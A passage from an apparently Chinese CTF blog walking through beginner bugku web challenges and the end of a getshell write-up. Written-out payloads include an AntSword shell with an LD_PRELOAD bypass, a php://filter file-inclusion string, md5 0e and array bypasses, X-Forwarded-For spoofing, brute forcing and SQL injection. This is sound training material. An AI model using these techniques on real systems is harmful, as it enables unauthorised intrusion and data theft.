连接成功后，发现只能访问html下的文件，无法访问其他地方<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234746.png" alt=""><br>
使用蚁剑的插件查看<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%401_G8RIP%40LEN%60S1BS~_392H.png" alt=""><br>
发现putenv没有被禁用，果断采取LD_PRELOAD方法绕过😋<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/6GH~0V%7D84%29B%7DA%24CIRIA_HG7.png" alt=""><br>
生成文件之后，再连接我们生成的那个文件<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/WWVHCE%24U9%7B63MW%60I5LGAU%60I.png" alt=""><br>
连接后，可以突破限制访问其他地方<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%7BN83F_52HH4~9ZTQB%2543%5DYW.png" alt=""><br>
flag在根目录下获得😀<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%28KDTXR%40KF5NY%7D%5DX8U2ZKGIJ.png" alt=""></p>
<h1>Misc</h1>
<h1>Reverse</h1>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku平台web题目~持续更新中！（新手推荐）</title>
    <url>/posts/55334/</url>
    <content><![CDATA[<ol>
<li>
<h2 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h2>
<p>打开页面，是一群会动的滑稽，还越动越快，哈哈哈</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web2/6YPR%25%7B%40PNPA%5BNUEN%7BBW6VGQ.png" alt=""></p>
<p>好啦，看起来页面给不出什么有用的信息，我们查看一下源代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web2/7%60CZ6H%24XMN37HSV%40%5BKG%40%60YW.png" alt=""></p>
<p>发现flag，通关！</p>
</li>
<li>
<h2 id="计算器"><a class="header-anchor" href="#计算器">¶</a>计算器</h2>
<p>进入环境后，发现给出一串数字计算，但怎么也输入不了超过两位数的数字，只能输入一位</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/R%60T%5B%60G~%24KK_4G73~~FWC%40YY.png" alt=""></p>
<p>猜测是前端限制，打开后，修改1数值为2，就可以输入两位数字了，然后提交获取flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/%28RKID%60YAVX1ZTCXS9%7B3%7D~KU.png" alt=""></p>
<p>当然，还有另一种方法，就是去找他的js文件，找了一下，发现flag了</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/51MY%5B%7DSCM%29%60XKFO4SI8Z3%7DM.png" alt=""></p>
</li>
<li>
<h2 id="GET"><a class="header-anchor" href="#GET">¶</a>$_GET</h2>
<p>看题目也知道是get方式发送请求，打开后看页面给出的代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/get/UZAL7ME3%7BJQ7OQ%7BCE1VC193.png" alt=""></p>
<p>查看代码，告诉我们传参给what，当传的参数值为flag，输出flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/get/YINKR%28%29%7BP6602C3PPQ%60C%7B15.png" alt=""></p>
<p>ok,获取到flag。</p>
</li>
<li>
<h2 id="POST"><a class="header-anchor" href="#POST">¶</a>$_POST</h2>
<p>这次要求我们使用post方式传参</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/post/J%7B4QX%29%5DODJBTH%257%25PJZVRH2.png" alt=""></p>
<p>和上道题目一样，需要对what参数传参flag回显答案，但我们不是使用get方式，而是使用post方式进行请求</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/post/UI%259OG4%7D99JEQ%7D4QQB%24U_S1.png" alt=""></p>
<p>回显flag，通关。</p>
</li>
<li>
<h2 id="矛盾"><a class="header-anchor" href="#矛盾">¶</a>矛盾</h2>
<p>打开题目，查看给出的代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/WM9ZE87%29%7BBW9%25ERIN9%7BW%248Y.png" alt=""></p>
<p>依然用get方式对参数num传值，但这次多了一个<strong>is_numeric()函数</strong>和一个<strong>if判断</strong>。</p>
<blockquote>
<p>isnumeric( )还是一个很实用的函数，在算法题目里面应该会有比较大的作用。</p>
<p>检测字符串是否只由数字组成，如果字符串中只包括数字，就返回Ture，否则返回False。</p>
</blockquote>
<p>同时我们还需要知道php的弱类型比较，例如’123a’会被转换成’123’,字符串的开头部分决定了它的值。如果该字符串以合法的数字开始，则使用该数字至和他连续的最后一个数字结束，否则其比较时整体值为0。</p>
<p>所以我们既要满足第一个不是纯数字又要数值上等于1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/OO%7D2%40M0%4076CCULY%5D3GNA%40QL.png" alt=""></p>
<p>成功，获取flag。</p>
</li>
<li>
<h2 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h2>
<p>打开题目环境，有一个弹框，一直点都一直弹出，f12点不开开发者工具，所以我们直接url请求查看源代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/%25WTF6%5D64VA%2846%5DGK7~%5B6%7BAM.png" alt=""></p>
<p>拉到底下，发现一串unicode编码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/S3AKL%5BJ%40%296T%25Z%5BWB8CAS7IC.png" alt=""></p>
<p>把它转成Ascii码即可解密获取flag呦</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/K%7DOPCINA9JMUUT6NFY1IT71.png" alt=""></p>
</li>
<li>
<h2 id="域名解析"><a class="header-anchor" href="#域名解析">¶</a>域名解析</h2>
<p>题目提示我们解析域名</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/HK%5DCS7TD%60%5BU9_SC%60H3%28%7B%25FE.png" alt=""></p>
<p>按照题目要求把flag.baidu.com解析到123.206.87.240，所以我们在本地的hosts文件里写入</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%5D4%28BG%28N5%7DD%28Y%40KWWD~ISX~B.png" alt=""></p>
<p>再访问flag.baidu.com即可得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/BC%5BB1EG9A%5D%7BSO%28%5DTKKV%605Z7.png" alt=""></p>
</li>
<li>
<h2 id="你必须让他停下"><a class="header-anchor" href="#你必须让他停下">¶</a>你必须让他停下</h2>
<p>打开页面，是一个不停刷新的画面</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/_J5%28NO03FKQI%5BU%5D%7B0QOIL1L.png" alt=""></p>
<p>仔细观察了一下，发现有一次请求中源代码会显示出flag，所以我们使用burpsuite抓包，然后进行若干次发送请求</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/WLO9%24%5B0%40N%7D96OW%5B%25F%60Q626H.png" alt=""></p>
<p>在请求图片名字为10的时候，暴露出flag。</p>
</li>
<li>
<h2 id="本地包含"><a class="header-anchor" href="#本地包含">¶</a>本地包含</h2>
<p>题目环境打不开，可能平台出问题了，暂时跳过…</p>
</li>
<li>
<h2 id="变量1"><a class="header-anchor" href="#变量1">¶</a>变量1</h2>
<p>打开题目，给出php代码，我们进行一波代码审计</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/TID%7DDC4B%283WM90Y_%5D%60DLX2X.png" alt=""></p>
<p>首先需要对args用get方式进行一个传参，第一个if里面含有正则，对一些字符进行了一个过滤，还发现下面<strong>var_dump</strong>里的变量有两个$$，这是一个可变变量。</p>
<blockquote>
<p>可变变量是一种独特的变量，它允许动态改变一个变量名称。其工作原理是该变量的名称由另一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“$”.</p>
</blockquote>
<p>所以我们需要对args传一个变量的值，通过var_dump来显示它的信息，php中的全局变量有以下几种</p>
<blockquote>
<ul>
<li>$_POST [用于接收post提交的数据]</li>
<li>$_GET [用于获取url地址栏的参数数据]</li>
<li>$_FILES [用于文件就收的处理img 最常见]</li>
<li>$_COOKIE [用于获取与setCookie()中的name 值]</li>
<li>$_SESSION [用于存储session的值或获取session中的值]</li>
<li>$_REQUEST [具有get,post的功能，但比较慢]</li>
<li>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</li>
<li>$GLOBALS [一个包含了全部变量的全局组合数组]</li>
<li>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</li>
</ul>
</blockquote>
<p>我们这里使用GLOBALS全局变量进行构造</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/EW%7BSV%7B4D%29ZL3L~CLXXN4M%25Q.png" alt=""></p>
<p>ok，回显出flag。</p>
</li>
<li>
<h2 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h2>
<p>打开页面提示是jsfuck加密</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/S%24E92B%60%7BE%24X%29T1UC%28%400H%24FG.png" alt=""></p>
<p>没有什么有用的信息，我们查看源代码，发现一堆编码出现在我们面前</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/G%2444%402T5FQDV%25%7DF8OY%28M1AS.png" alt=""></p>
<p>jsfuck其实是一串js代码，经过了特殊的编写方式，把包含的字符做到极致，最后只剩下 ()+[]!  这六个字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false       &#x3D;&gt;  ![]</span><br><span class="line">true        &#x3D;&gt;  !![]</span><br><span class="line">undefined   &#x3D;&gt;  [][[]]</span><br><span class="line">NaN         &#x3D;&gt;  +[![]]</span><br><span class="line">0           &#x3D;&gt;  +[]</span><br><span class="line">1           &#x3D;&gt;  +!+[]</span><br><span class="line">2           &#x3D;&gt;  !+[]+!+[]</span><br><span class="line">10          &#x3D;&gt;  +[[+!+[]]+[+[]]]</span><br><span class="line">Array       &#x3D;&gt;  []</span><br><span class="line">Number      &#x3D;&gt;  +[]</span><br><span class="line">String      &#x3D;&gt;  []+[]</span><br><span class="line">Boolean     &#x3D;&gt;  ![]</span><br><span class="line">Function    &#x3D;&gt;  [][&quot;filter&quot;]</span><br><span class="line">run         &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">eval        &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return eval&quot;)()( CODE )</span><br><span class="line">window      &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure>
<p>所以我们复制粘贴这串jsfuck到控制台输出，得到结果</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/%28JU~1L3FO~6KTRQV886%25%60%40W.png" alt=""></p>
<p>再按题目提示的，转换成大写的形式，提交即可。</p>
</li>
<li>
<h2 id="头等舱"><a class="header-anchor" href="#头等舱">¶</a>头等舱</h2>
<p>进去后，发现确实和页面说的一样，啥信息都没有</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/AJH%28INH1G56374%249K6G%29IWB.png" alt=""></p>
<p>好，我们抓包看看，有没有什么有用的信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/2CWHD%60%25%5BADSG%25H2W%5DYX9H%29Y.png" alt=""></p>
<p>好吧，flag这就出来了。</p>
</li>
<li>
<h2 id="网站被黑"><a class="header-anchor" href="#网站被黑">¶</a>网站被黑</h2>
<p>打开环境，是一个被挂了黑页的网站</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/QQ%E6%88%AA%E5%9B%BE20201018162409.png" alt=""></p>
<p>我们先扫一下页面，看看留下了什么</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/UT~3VV~T72FTBD_PXMF3L68.png" alt=""></p>
<p>发现有一个shell.php，我们去访问一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/I%40OI%250XWBJ%40M5%28X%25QY%286IAC.png" alt=""></p>
<p>发现是一个需要登录的页面，我们使用burpsuite爆破一下密码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/2GRA6H%7BML86%7DW%5DM8R7A8%29SR.png" alt=""></p>
<p>爆破得到密码为hack，输入密码，得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/T6Z2%25VF%290%7D%2938%5D%7B%7D9PSS%602F.png" alt=""></p>
</li>
<li>
<h2 id="管理员系统"><a class="header-anchor" href="#管理员系统">¶</a>管理员系统</h2>
<p>打开页面，发现是一个登录框，先查看一下源码，找找有没有什么提示</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/Z8%40230%7BC%7B6V8GOE7D851%291M.png" alt=""></p>
<p>发现一串base64加密的数据，我们去解密看看</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/B9_3MUJUL493G0Y816ECBR1.png" alt=""></p>
<p>猜测这应该是密码，账号的话默认admin试试，毕竟管理员系统嘛</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/0MBMGO20DMNSRR1%29%40%5BD85H0.png" alt=""></p>
<p>发现提示我们ip禁止登陆，应该是要指定ip，本地本地本地…emmm，那是提示我们127.0.0.1吧，试试一波。</p>
<p>加个X-Forwarded-For头进去发一下包</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/NWQJ4%7D9Y_%40I7B8%5B%25COSZ%25%28Y.png" alt=""></p>
<p>发现登陆成功，flag回显出来了，嘿嘿嘿。</p>
</li>
<li>
<h2 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h2>
<p>进来就提示我们查看源代码，不错不错</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/~TO%29FETA5%29%254NP4%7D7Z%29%29%60F2.png" alt=""></p>
<p>移步去源代码，发现js里有三串经过url编码的数据</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/E%7BUM%24%408%28ZAX3GGX%7D5TXVB%60R.png" alt=""></p>
<p>我们去解码后，把这三串解密的数据拼接起来，这里建议去在线的js格式美化网站进行格式化，然后得到</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/XVK%24A9MCZ4K%7BWC%28O09K%29J9F.png" alt=""></p>
<p>我们把这一串字符串“67d709b2baa648cf6e87a7114f1”输入提交框</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/%5B%5DT%40%25X0FAPWVTXIR%5DU%5DS%296M.png" alt=""></p>
<p>flag就出来了，但让我有一点点迷惑，按js代码里说应该获取的是id为password里的值，但我们刚刚看源代码，提交框的id是flag…来自菜鸡的迷惑。</p>
</li>
<li>
<h2 id="flag在index里"><a class="header-anchor" href="#flag在index里">¶</a>flag在index里</h2>
<p>打开页面，只有一个链接点击</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/U5%5D7%7B%406A_%2421B%2946Q%5BR%60%4033.png" alt=""></p>
<p>点开连接后显示一个文本，查看了源码发现没有什么信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/%5B%29F%40DM%5B9%409W%7B92XX%29XQFEAD.png" alt=""></p>
<p>注意到url有个file参数，猜一波文件包含。</p>
<p>使用php协议进行读取：file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>先对这个协议进行一波解释：</p>
<blockquote>
<p>file进行get传参，题目前面提示我们的index.php，php://filter/是访问本地文件的协议，read表示要读取的链的筛选列表，resource表示访问的目标文件。</p>
<p>为什么中间要进行一波base64加密呢？因为不进行base64加密，会直接当成php文件执行。而我们传递的参数被include()函数引入了base64的格式，执行不成功，所以会返回文件的源码。</p>
</blockquote>
<p>使用php文件协议后，页面返回一串被base64加密的源码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C5TYJ8CEF%29N%5DM%60%5BNNNC%60W%5B5.png" alt=""></p>
<p>解密base64之后得到</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C_%7DDCAG%5B2RL2BJM%40Z4SN3VI.png" alt=""></p>
<p>发现flag藏在注释中，闯关成功！</p>
</li>
<li>
<h2 id="输入密码查看flag"><a class="header-anchor" href="#输入密码查看flag">¶</a>输入密码查看flag</h2>
<p>进来是一个输入密码的登陆框</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/S%25XM%289XXWB3O%24H%28%7DJEJUA%5D5.png" alt=""></p>
<p>老规矩。按照题目提示，使用burpsuite抓包爆破密码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/_SB%40QY%24%7B3_O3N_ZXVDJU46I.png" alt=""></p>
<p>因为说的5位数字，所以按10000到90000爆破试试</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png" alt=""></p>
<p>去冲杯牛奶先…</p>
<p>ok。爆破成功，查看response，得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png" alt=""></p>
</li>
<li>
<h2 id="点击一百万次"><a class="header-anchor" href="#点击一百万次">¶</a>点击一百万次</h2>
<p>好家伙，又是一道链接挂掉的题目，待续…</p>
</li>
<li>
<h2 id="备份是个好习惯"><a class="header-anchor" href="#备份是个好习惯">¶</a>备份是个好习惯</h2>
<p>打开页面是一串字符串，没看懂啥意思</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/NPU2G0NO%29~UHHH%7D%24P%29HJZ2U.png" alt=""></p>
<p>按照题目提示，应该是有备份文件泄露，猜测应该是常见的bak文件，使用工具扫一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/%28~%60BF%7DB_%24MW9P%60I%2827BN2ZN.png" alt=""></p>
<p>发现存在bak文件，我们访问这个路径后，下载bak文件，打开出现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码意思是，对key进行一个过滤，然后传参key1和key2两个参数，同时key1和key2的md5值要相等，并且未经过md5加密前的值不能相等，满足条件就会输出flag。</p>
<p>对于key过滤我们可以考虑使用双写的方法，kkeyey1</p>
<p>这里说一下可以利用==漏洞和数组漏洞绕过md5</p>
<p><strong>==漏洞：</strong></p>
<blockquote>
<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
</blockquote>
<p><strong>数组漏洞：</strong></p>
<p>md5()函数无法处理数组，如果我们传数组进去，会返回一个NULL，所以两个数组经过加密后得到的都是相同的NULL。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/JE36DTP5PN~GP5EA2POZ%28YI.png" alt=""></p>
<p>ok，成功绕过，取得flag。</p>
</li>
<li>
<h2 id="成绩单"><a class="header-anchor" href="#成绩单">¶</a>成绩单</h2>
<p><strong>手工注入：</strong></p>
<p>根据页面内容，还有输入框的提示1,2,3，猜测应该是sql注入的类型，尝试传参一个1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/3V6%28G84T%29H%5BA_Z_%24%7B%25NG%7BSH.png" alt=""></p>
<p>有回显，再加个’号测试测试</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/%29FK7%5DYXUELQ96IWRV_V8%7DML.png" alt=""></p>
<p>发现没有回显，加一个注释试试</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/BJT40REGPF%7D2%5D19_N_S%25K07.png" alt=""></p>
<p>有数据回显，判定是存在sql注入，我们查查应该有多少列，其实看网页显示的数据，就能看出是4列了，但还是测试一下，免得判断错误</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/Q%28CQDWU%7D%5DFT%60%25%24H8%25AK8B%5BB.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/HX%292DBLC3G%603~%5D%28%5D5KWB%254L.png" alt=""></p>
<p>发现为4时有回显数据，为5时没有数据回显，判断有4列</p>
<p>那我们直接来尝试联合注入，查查数据库名字，这里记得要写成id=-1’，把前面查询的数据置空，当然id=0也是可以的</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/I6M%7DB2QK6WB4MF3ILV_WMRG.png" alt=""></p>
<p>查出数据库的名字为：skctf_flag</p>
<p>继续查表名字</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/%28CVZ%7D%5D97KJW5_%40GLWYO_O%24S.png" alt=""></p>
<p>查出有两个表，分别为fl4g和sc，我们先查表为fl4g的列名</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/V12W79PWN~1R%25~FUWXJEC%5BF.png" alt=""></p>
<p>得到列名为skctf_flag，下一步查看列里面的数据</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/3Z1HO%7BD%40J%5B%24NINEOQ4SWQ7T.png" alt=""></p>
<p>ok，爆出flag了，大功告成！</p>
<p><strong>使用sqlmap工具爆破</strong>：</p>
<p>首先这是个post方式提交的，所以我们需要用burpsuite进行抓取数据包</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/_T9%5DIEYFI%29%7D3B1ULO69CXNK.png" alt=""></p>
<p>然后复制到文本文件上</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/V_2IY%7D%295REKL6GRA4AMZFCG.png" alt=""></p>
<p>查询数据库：</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/ZCI8V7QAV3DBW%60%5B%40J8~_BLP.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/BJB0ITHDT2EF%28H7Y%29%60ADNMG.png" alt=""></p>
<p>查询表名：</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/RA5%29I%7DFT%7BV2S%28L87RD%60AD%40O.png" alt=""></p>
<p>查询字段名：</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/B~%40I%25~2Z52PR1WEJ5YEC5%7DE.png" alt=""></p>
<p>查询字段信息：</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/PSMH%7DE%25MAI~EMU434%7DLDE%5B2.png" alt=""></p>
</li>
<li>
<h2 id="秋名山老司机"><a class="header-anchor" href="#秋名山老司机">¶</a>秋名山老司机</h2>
<p>喂，高桥凉介吗？我是藤原拓海，我想加入…车队。</p>
<p>哈哈，不好意思，走错片场了</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/2NGXH%7DD8~~%24%7BFV9YRG%2826QK.jpg" alt=""></p>
<p>打开页面，是一个很长的计算式子，而且2s内又会发生变化。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/X5_XP_O_%5BCZ%5DL1H1B%7BWIQPV.png" alt=""></p>
<p>翻了一下网页源码也没有什么有用的信息，猜测是需要我们向他发送一个post数据包，数据为式子的计算值，但它没有给出需要传参的对象是什么。而且在2s内计算出值不太可能，这个时候我们需要写一个python脚本跑一跑</p>
